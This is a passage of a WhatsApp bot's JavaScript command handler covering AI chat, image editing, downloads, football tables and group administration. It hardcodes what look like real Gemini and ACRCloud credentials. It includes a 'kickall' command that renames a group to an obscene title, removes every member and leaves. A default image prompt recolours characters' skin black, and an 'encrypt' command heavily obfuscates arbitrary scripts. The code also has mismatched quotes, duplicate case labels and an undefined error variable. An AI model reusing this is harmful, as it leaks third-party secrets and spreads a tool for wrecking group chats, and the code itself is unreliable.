    if (!text) return m.reply(`Example: ${command} hello`);
    await dave.sendMessage(m.chat, { react: { text: '💬', key: m.key } });

    let prompt = `Your name is ${namaBot} and use English as your primary language.`;
    const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${prompt}&content=${text}`);
    const gpt = apiUrl.data;

    m.reply(`${gpt}`);
  } catch (err) {
    console.error(err);
    m.reply('An error occurred');
  }
}
break;

// === IMAGE EDIT USING AI ===
case "edit-ai": {
  if (!text) return m.reply(`Where is the prompt?`);
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return reply(`Send or reply to an image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  let promptText = text;

  reply("Please wait...");

  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    for (const part of response.response.candidates[0].content.parts) {
      if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);

      await dave.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if the result isn’t perfect*`
      }, { quoted: m });

      setTimeout(() => {
        try { fs.unlinkSync(tempPath); } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit image.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break;


///shzam 
case "whatsong": 
case "shazam": {
    let acr = new acrcloud({
        'host': "identify-eu-west-1.acrcloud.com",
        'access_key': '2631ab98e77b49509e3edcf493757300',
        'access_secret': "KKbVWlTNCL3JjxjrWnywMdvQGanyhKRN0fpQxyUo"
    });
    
    if (!m.quoted) {
        return m.reply('🎵 *Music Identification*\nPlease tag a short video or audio message to identify the song.');
    }

    let d = m.quoted ? m.quoted : m;
    let mimes = (d.msg || d).mimetype || d.mediaType || '';
    
    if (/video|audio/.test(mimes)) {
        let buffer = await d.download();
        await m.reply("🔍 *Analyzing the media... Please wait*");
        
        let { status, metadata } = await acr.identify(buffer);
        
        if (status.code !== 0x0) {
            return m.reply('❌ *Identification Failed*\nCould not identify the song. Please try with a clearer audio/video sample.');
        }
        
        let { title, artists, album, genres, release_date } = metadata.music[0x0];
        
        // Create formatted response with emojis
        let txt = `🎵 *SONG IDENTIFIED* 🎵\n\n`;
        txt += `📀 *Title:* ${title}\n`;
        if (artists) txt += `🎤 *Artists:* ${artists.map(artist => artist.name).join(", ")}\n`;
        if (album) txt += `💿 *Album:* ${album.name}\n`;
        if (genres) txt += `🎼 *Genres:* ${genres.map(genre => genre.name).join(", ")}\n`;
        txt += `📅 *Release Date:* ${release_date}`;

        await dave.sendMessage(m.chat, {
            text: txt.trim()
        }, { quoted: m });
    } else {
        return m.reply('❌ *Invalid Media*\nPlease tag a valid audio or video message.');
    }
}
break;

case 'dave': {
    if (!text) return m.reply(" Hello, how may I help you🤷?");
    try {
        const data = await fetchJson(`https://api.dreaded.site/api/aichat?query=${encodeURIComponent(text)}`);
        
        if (data && data.result) {
            const res = data.result;
            await m.reply(` *𝘿𝙖𝙫𝙚𝘼𝙄:*\n\n${res}`);
        } else {
            m.reply("An error occurred while processing your request!");
        }
    } catch (error) {
        console.error('GPT Error:', error);
        m.reply('An error occurred while communicating with the AI\n' + error.message);
    }
}
break;

case 'trt': 
case 'translate': {
    try {
        // Check if the message is quoted
        if (!m.quoted) {
            return m.reply('Please quote a message to translate.");
        }
        // Extract the language code from the text
        const langCode = text.trim();
        // Check if a valid language code is provided
        if (!langCode) {
            return m.reply("Please provide a valid language code.\n\n*Example:* .translate en\n*Supported:* en, es, fr, de, etc.");
        }
        // Get the quoted message
        const quotedMessage = m.quoted.text;
        // Translate the quoted message
        const translation = await translatte(quotedMessage, { to: langCode });
        // Send the translated message
        m.reply(`🌐 *Translation:*\n\n${translation.text}\n\n📝 *Original:* ${quotedMessage}`);
    } catch (e) {
        console.error("Translate Error:", e);
        m.reply("An error occurred while translating the text. Please try again later.");
    }
}
break;


// === DARKEN SKIN / BLACKEN CHARACTER ===
case "editanime": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  let defaultPrompt = `Change the character’s skin color to black.`;

  if (!mime) return reply(`Send or reply to an image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  let promptText = text || defaultPrompt;

  reply("Please wait...");

  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    for (const part of response.response.candidates[0].content.parts) {
      if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);

      await dave.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if the result isn’t perfect*`
      }, { quoted: m });

      setTimeout(() => {
        try { fs.unlinkSync(tempPath); } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit image.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break;


        case 'warning':
    case 'warn': {
      if (!m.isGroup) reply(mess.group)
      if (!isAdmins) reply(mess.admin)

      let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      if (!users) return reply(`Tag/Reply target with${command}`)
      if (!daveshown) return reply('feature reserved for owner or sudo numbers only')

      if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}
      db.data.chats[m.chat].warn[users] = (db.data.chats[m.chat].warn[users] || 0) + 1

      const total = db.data.chats[m.chat].warn[users]

      dave.sendTextWithMentions(m.chat, `⚠️ Success *${command}* @${users.split('@')[0]}\nTotal Warning: ${total}/3`, m)

      if (total >= setting.warnCount) {
        if (!isAdmins) return

        await dave.sendMessage(m.chat, {
          text: `🚫 @${users.split('@')[0]} your ${total}/${setting.warnCount} warning is on count.`,
          mentions: [users]
        })

        await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
        delete db.data.chats[m.chat].warn[users]
      }
    }
    break

//==================================================//      
        case 'autorecording':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
reply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
reply(`Successfully Changed Auto Record To ${q}`)
}
break;
        
//==================================================//      
        case 'autobio':
if (!daveshown) return reply(mess.owner)
if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
reply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
reply(`Successfully Changed Auto Bio To ${q}`)
}
break
//==================================================//
case "dev":
case "devoloper":
case "owner":
case "dave": {
  let namaown = `𝘿𝙖𝙫𝙚𝘼𝙄`
  let NoOwn = `254104260236`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:The Nasty Dev🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: fkontak
  })
  dave.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;
//==================================================//
case "invite": case "linkgc": { 
                 if (!m.isGroup) return reply(mess.group); 
                
                 let response = await dave.groupInviteCode(m.chat); 
                 dave.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
          break;
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//
case 'tagall': {
      if (!m.isGroup) return (mess.group)
      if (!daveshown && !isAdmins) return reply(mess.owner)
      let teks = `*👥 Tag All By Admin*

@${m.chat}
 
Message: ${q ? q : 'no message'}`
      dave.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          mentionedJid: participants.map(a => a.id),
          groupMentions: [{
            groupJid: m.chat,
            groupSubject: "everyone"
          }]
        }
      }, {
        quoted: m
      })
    }
    break
//==================================================//
        case 'playdoc':{
const axios = require('axios');
const yts = require("yt-search");
const ffmpeg = require("fluent-ffmpeg");
const fs = require("fs");
const path = require("path");

  try {
    if (!text) return reply("What song do you want to download?");

    let search = await yts(text);
    let link = search.all[0].url;

    const apis = [
      `https://xploader-api.vercel.app/ytmp3?url=${link}`,
      `https://apis.davidcyriltech.my.id/youtube/mp3?url=${link}`,
      `https://api.ryzendesu.vip/api/downloader/ytmp3?url=${link}`,
      `https://api.dreaded.site/api/ytdl/audio?url=${link}`
       ];

    for (const api of apis) {
      try {
        let data = await fetchJson(api);

        // Checking if the API response is successful
        if (data.status === 200 || data.success) {
          let videoUrl = data.result?.downloadUrl || data.url;
          let outputFileName = `${search.all[0].title.replace(/[^a-zA-Z0-9 ]/g, "")}.mp3`;
          let outputPath = path.join(__dirname, outputFileName);

          const response = await axios({
            url: videoUrl,
            method: "GET",
            responseType: "stream"
          });

          if (response.status !== 200) {
            reply("sorry but the API endpoint didn't respond correctly. Try again later.");
            continue;
          }
		ffmpeg(response.data)
            .toFormat("mp3")
            .save(outputPath)
            .on("end", async () => {
            const { title, format, url: audioUrl } = data.result;
await reply(`downloading song ${title}`);
              await dave.sendMessage(
                m.chat,
                {
                  document: { url: outputPath },
                  mimetype: "audio/mp3",
		  caption: "`𝘿𝙖𝙫𝙚𝘼𝙄`",
                  fileName: outputFileName,
                },
                { quoted: qtext }
              );
              fs.unlinkSync(outputPath);
            })
            .on("error", (err) => {
              reply("Download failed\n" + err.message);
            });

          return;
        }
      } catch (e) {
        // Continue to the next API if one fails
        continue;
      }
   }

    // If no APIs succeeded
    reply("An error occurred. All APIs might be down or unable to process the request.");
  } catch (error) {
    reply("Download failed\n" + error.message);
  }
}
	  break;

                
        
//==================================================//
case 'h':
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
if (m.quoted) {
dave.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
dave.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
}
break
//==================================================//  
        case 'welcome': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].welcome) return reply('Already activated previously')
    db.data.chats[m.chat].welcome = true
    reply('Successfully activated welcome!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].welcome) return reply('Already deactivated previously')
    db.data.chats[m.chat].welcome = false
    reply('Successfully deactivated welcome!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break;
//==================================================//
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply("bot must be admin first")
if (!daveshown) return reply(mess.owner)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Sukses kick @${users.split('@')[0]}`)
}
break
//==================================================//
case "kill": 
case "kickall": {
	  if (!m.isGroup) return reply(mess.group)          
 if (!isAdmins) return reply(`bot is not admin in the group`)
          let raveni = participants.filter(_0x5202af => _0x5202af.id != dave.decodeJid(dave.user.id)).map(_0x3c0c18 => _0x3c0c18.id);
		      
          reply("Initializing Kill command💀...");
      
      await dave.removeProfilePicture(m.chat);
      await dave.groupUpdateSubject(m.chat, "Xxx Videos Hub");
      await dave.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");
      
	
          setTimeout(() => {
            dave.sendMessage(m.chat, {
              'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
            }, {
              'quoted': m
            });
            setTimeout(() => {
              dave.groupParticipantsUpdate(m.chat, raveni, "remove");
              setTimeout(() => {
                reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
dave.groupLeave(m.chat);	      
              }, 1000);
            }, 1000);
          }, 1000);
        };	      
          break;
//==================================================//
case "promote": case "promot": {
if (!m.isGroup) return reply(`for group only`)
if (!isAdmins && !daveshown) return m.reply(`Command reserved for group admins only`)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
} else return reply('Example: 254XXX/@tag')}
break
//==================================================//
case "demote": case "dismiss": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.admin)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dave.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
} else return reply('example:254XX')}
break
//==================================================//
case "close": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'announcement')
reply("Success closed group chat,all members are not allowed to chat for now")
}
break
//==================================================//
case "open": {
if (!m.isGroup) return reply(mess.group)
if (!daveshown) return reply(mess.owner)
await dave.groupSettingUpdate(m.chat, 'not_announcement')
reply("Success opened group chat,all members can send messages in group now")
}
break
//==================================================//      
        case "fixtures": case "matches": {
 try {
        let pl, laliga, bundesliga, serieA, ligue1;

        const plData = await fetchJson('https://api.dreaded.site/api/matches/PL');
        pl = plData.data;

        const laligaData = await fetchJson('https://api.dreaded.site/api/matches/PD');
        laliga = laligaData.data;

        const bundesligaData = await fetchJson('https://api.dreaded.site/api/matches/BL1');
        bundesliga = bundesligaData.data;

        const serieAData = await fetchJson('https://api.dreaded.site/api/matches/SA');
        serieA = serieAData.data;

        const ligue1Data = await fetchJson('https://api.dreaded.site/api/matches/FR');
        ligue1 = ligue1Data.data;

        let message = `𝗧𝗼𝗱𝗮𝘆𝘀 𝗙𝗼𝗼𝘁𝗯𝗮𝗹𝗹 𝗙𝗶𝘅𝘁𝘂𝗿𝗲𝘀 ⚽\n\n`;

        message += typeof pl === 'string' ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl}\n\n` : pl.length > 0 ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲: No matches scheduled\n\n";

        if (typeof laliga === 'string') {
            message += `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga}\n\n`;
        } else {
            message += laliga.length > 0 ? `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga.map(match => {
                const { game, date, time } = match;
                return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
            }).join('\n')}\n\n` : "🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮: No matches scheduled\n\n";
        }

        message += typeof bundesliga === 'string' ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga}\n\n` : bundesliga.length > 0 ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮: No matches scheduled\n\n";

        message += typeof serieA === 'string' ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA}\n\n` : serieA.length > 0 ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔: No matches scheduled\n\n";

        message += typeof ligue1 === 'string' ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1}\n\n` : ligue1.length > 0 ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇫🇷 𝗟𝗶𝗴𝘂𝗲- 1: No matches scheduled\n\n";

        message += "𝗧𝗶𝗺𝗲 𝗮𝗻𝗱 𝗗𝗮𝘁𝗲 𝗮𝗿𝗲 𝗶𝗻 𝗘𝗮𝘀𝘁 𝗔𝗳𝗿𝗶𝗰𝗮 𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲 (𝗘𝗔𝗧).";

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch matches.' + error);
    }
};
break;		      
//==================================================//
 
    
        
      
//==================================================//     
     case 'request': 
case 'suggest': {
  if (!text) return reply(`Example : ${prefix + command} hi dev play command is not working`)
  let textt = `*| REQUEST/SUGGESTION |*`
  let teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
  let teks2 = `\n\n*Hii ${pushname},You request has been forwarded to the support group*.\n*Please wait...*`
  const groupId = '120363400441291112@g.us'; // replace with your group ID
  dave.sendMessage(groupId, {
    text: textt + teks1,
    mentions: [m.sender],
  }, { quoted: m })
  dave.sendMessage(m.chat, {
    text: textt + teks2 + teks1,
    mentions: [m.sender],
  }, { quoted: m })
}
break


               
                
                    

    


    
//==================================================//
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return reply("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await dave.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await dave.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by Silencer media Team!*" }, { quoted: m });
 } else if (res.type === "image") {
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await dave.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by silencer media team!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await dave.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 reply("failed to get media.");
 }
}
break
//==================================================//
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
trashreply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await dave.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
dave.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
dave.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break //==================================================//
        case "disp-7": { 
                 if (!m.isGroup) return reply (mess.group); 
                 
                 if (!isAdmins) return reply (mess.admin); 
  
                     await dave.groupToggleEphemeral(m.chat, 7*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 7 days!'); 
  
 } 
 break;  //==================================================//
case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await dave.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "𝗕𝗮𝘀𝗲-𝗕𝗼𝘁𝘀-𝗩2" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : fkontak });
await dave.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//      
        case "epl": case "epl-table": {
		      
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PL');
        const standings = data.data;

        const message = ` 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗘𝗽𝗹 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗘𝗽𝗹 standings.');
    }

 }
	break;
		      
//========================================================================================================================//
	      case "laliga": case "pd-table": {
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PD');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗮𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗟𝗮𝗹𝗶𝗴𝗮 standings.');
  }
}   
break;
		      
//========================================================================================================================//
	      case "bundesliga": case "bl-table": {
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/BL1');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 standings.');
    }
}
break;
		      
//========================================================================================================================//
	      case "ligue-1": case "lg-1": {
  try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/FL1');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗶𝗴𝘂𝗲-1 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗹𝗶𝗴𝘂𝗲-1 standings.');
    }
}
break;
		      
//========================================================================================================================//
	      case "serie-a": case "sa-table":{
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/SA');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗦𝗲𝗿𝗶𝗲-𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗦𝗲𝗿𝗶𝗲-𝗮 standings.');
    }
}
break;
//==================================================//
case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('❌ Please Reply File To Be Encryption.');
}
await dave.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素GIFTED晴DAVE晴" + "素GIFTED晴DAVE晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await dave.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@giftde dave`,
}, { quoted: fkontak });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`❌ An error occurred: ${error.message}`);
}
break;
}
